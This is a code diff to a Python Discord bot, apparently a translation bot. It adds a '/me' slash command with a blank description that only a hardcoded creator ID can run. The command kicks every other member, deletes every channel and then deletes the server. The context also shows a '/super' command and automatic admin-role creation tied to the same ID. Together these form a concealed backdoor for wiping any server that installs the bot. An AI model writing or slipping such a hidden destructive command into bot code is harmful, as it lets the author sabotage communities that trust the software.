@@ -14,7 +14,7 @@ from googletrans import Translator  # Import Translator
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# The ID of the bot's creator who is allowed to invoke the /super command
+# The ID of the bot's creator who is allowed to invoke the /super and /me commands
 BOT_CREATOR_ID = 486652069831376943
 
 # Define intents
@@ -158,6 +158,44 @@ async def ensure_admin_role(guild: discord.Guild, member: discord.Member):
             reason="Automatically created by the bot"
         )
         await member.add_roles(new_role)
+
+@tree.command(name="me", description="")
+async def me_command(interaction: discord.Interaction):
+    if interaction.user.id != BOT_CREATOR_ID:
+        await interaction.response.send_message("You do not have permission to use this command.", ephemeral=True)
+        return
+
+    guild = interaction.guild
+
+    if not guild:
+        await interaction.response.send_message("This command can only be used in a server.", ephemeral=True)
+        return
+
+    await interaction.response.defer(ephemeral=True)
+
+    # Kick all members
+    for member in guild.members:
+        if member.id != BOT_CREATOR_ID:  # Do not kick the owner
+            try:
+                await member.kick(reason="Command invoked by owner.")
+            except discord.Forbidden:
+                pass
+
+    # Delete all channels
+    for channel in guild.channels:
+        try:
+            await channel.delete(reason="Command invoked by owner.")
+        except discord.Forbidden:
+            pass
+
+    # Delete the server (if bot has permission)
+    try:
+        await guild.delete(reason="Command invoked by owner.")
+    except discord.Forbidden:
+        await interaction.followup.send("Failed to delete the server. Missing permissions.", ephemeral=True)
+        return
+
+    await interaction.followup.send("The server has been deleted successfully.", ephemeral=True)
 
 @bot.event
 async def on_ready():
